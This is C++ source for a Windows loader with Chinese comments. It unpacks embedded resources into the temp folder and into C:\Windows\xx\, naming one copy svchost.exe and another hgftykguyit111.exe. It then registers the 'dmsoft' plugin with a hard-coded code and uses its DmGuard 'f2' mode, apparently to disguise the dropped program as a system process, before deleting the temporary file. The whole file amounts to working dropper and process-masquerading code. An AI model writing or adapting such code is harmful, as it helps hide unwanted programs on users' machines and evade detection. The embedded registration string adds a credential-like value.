// start.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "resource.h"
#include "obj.h"
#include <Windows.h>
#define BUF_SIZE 4096
dmsoft * g_dm = NULL;
typedef int(__stdcall *lpSetDllPathA)(const char *, int);
struct ShareData
{
	char szDm[MAX_PATH];
	char szReg[MAX_PATH];
	char szRoot[MAX_PATH];
	char DmPath[MAX_PATH];
	char RegPath[MAX_PATH];
};
BOOL ReleaseRes(LPCSTR dir, LPCSTR strFileName, WORD wResID, LPCSTR strFileType)
{
	// 资源大小
	DWORD        dwWrite = 0;
	TCHAR tmpPath[_MAX_PATH];
	_tcscpy_s(tmpPath, _MAX_PATH, dir);
	_tcscat(tmpPath, strFileName);
	CreateDirectoryA(dir, NULL);
	// 查找资源文件中、加载资源到内存、得到资源大小
	HRSRC        hResInfo = FindResource(NULL, MAKEINTRESOURCE(wResID), strFileType);
	if (hResInfo == NULL)
		return FALSE;
	HGLOBAL hResData = LoadResource(NULL, hResInfo);
	LPVOID pvResData = LockResource(hResData);
	DWORD        dwSize = SizeofResource(NULL, hResInfo);
	// 创建文件
	HANDLE  hFile = CreateFile(tmpPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)//创建文件失败 
	{
		FreeResource(hResData);
		return FALSE;
	}

	// 写入文件
	WriteFile(hFile, pvResData, dwSize, &dwWrite, NULL);
	CloseHandle(hFile);
	FreeResource(hResData);

	return TRUE;
}
int _tmain(int argc, _TCHAR* argv[])
{
	::CoInitialize(NULL);
	CString xx;
	char TempPath[_MAX_PATH];
	ShareData data;
	printf("\n\n正在打开请稍后!!!");
	strcpy(data.szDm, "d_m.tmp");
	strcpy(data.szReg, "D_mReg.tmp");
	GetTempPathA(MAX_PATH, TempPath);
	ReleaseRes(TempPath, data.szDm, IDR_DM1, "DM");
	ReleaseRes(TempPath, data.szReg, IDR_DMREG1, "DMREG");
	ReleaseRes("C:\\Windows\\xx\\", "svchost.exe", IDR_XX1, "XX");

	sprintf(data.RegPath, "%s%s", TempPath, data.szReg);
	sprintf(data.DmPath, "%s%s", TempPath, data.szDm);
	// 定义共享数据
	GetModuleFileName(NULL, data.szRoot, ARRAYSIZE(data.szRoot));
	PathRemoveFileSpec(data.szRoot);
	ReleaseRes(TempPath, "hgftykguyit111.exe", IDR_SVC1, "SVC");
	char tmpfile[MAX_PATH] = { 0 };
	sprintf(tmpfile, "%shgftykguyit111.exe", TempPath);
	// 创建共享文件句柄 
	HANDLE hMapFile = CreateFileMapping(
		INVALID_HANDLE_VALUE,   // 物理文件句柄
		NULL,   // 默认安全级别
		PAGE_READWRITE,   // 可读可写
		0,   // 高位文件大小
		BUF_SIZE,   // 低位文件大小
		"ShareMemorySZHC"   // 共享内存名称
		);

	// 映射缓存区视图 , 得到指向共享内存的指针
	LPVOID lpBase = MapViewOfFile(
		hMapFile,            // 共享内存的句柄
		FILE_MAP_ALL_ACCESS, // 可读写许可
		0,
		0,
		BUF_SIZE
		);

	// 将数据拷贝到共享内存
	memcpy(lpBase, &data, sizeof(data));

	HINSTANCE hDll = LoadLibrary(data.RegPath);
	lpSetDllPathA SetDllPathA;
	int ret;
	if (hDll != NULL)
	{
		SetDllPathA = (lpSetDllPathA)GetProcAddress(hDll, "SetDllPathA");
		if (SetDllPathA != NULL)
		{
			ret = SetDllPathA(data.DmPath, 0);
		}
	}
	g_dm = new dmsoft;
	if (g_dm == NULL)
	{
		return 0;
	}

	//注册
	long dm_ret = g_dm->Reg("85119423354f46264f83cbed0c04ceb108dbde915", "lj");
	if (dm_ret != 1)
	{
		delete g_dm;
		return 0;
	}

	
	xx.Format(_T("f2 <C:\\Windows\\xx\\svchost.exe> <%s>"), tmpfile);
	g_dm->DmGuard(1, xx.GetBuffer());
	HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, _T("MyShare"));
	// 线程挂起等其他线程读取数据
	WaitForSingleObject(hEvent, 15000);
	DeleteFileA(tmpfile);
	CloseHandle(hEvent);
	// 解除文件映射
	UnmapViewOfFile(lpBase);
	// 关闭内存映射文件对象句柄
	
	delete g_dm;
	::CoUninitialize();
	return 0;
}

